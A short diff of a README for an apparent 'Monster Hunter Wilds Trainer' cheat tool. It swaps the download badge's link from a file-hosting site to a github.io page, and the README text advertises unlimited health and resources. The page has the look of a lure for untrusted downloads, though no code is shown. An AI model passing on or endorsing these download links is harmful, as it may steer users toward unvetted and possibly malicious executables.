@@ -1,4 +1,4 @@
-[![Download Monster Hunter Wilds Trainer](https://img.shields.io/badge/Download-MonsterHunterWilds%20Trainter-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Monster Hunter Wilds Trainer](https://img.shields.io/badge/Download-MonsterHunterWilds%20Trainter-blueviolet)](https://monster-hunter-wilds-trainer.github.io/.github/)
 
 
 **Monster Hunter Wilds Trainer** is a cheat tool designed for Monster Hunter Wilds, offering players the ability to modify their gameplay experience with a range of cheats and enhancements. The trainer allows users to access features like unlimited health, resources, enhanced abilities, and more, making it easier to progress through the game, defeat monsters, and gather items without the usual challenges. This tool can be used to experiment with the game or to bypass certain difficulties, providing a more relaxed and customizable gaming experience.
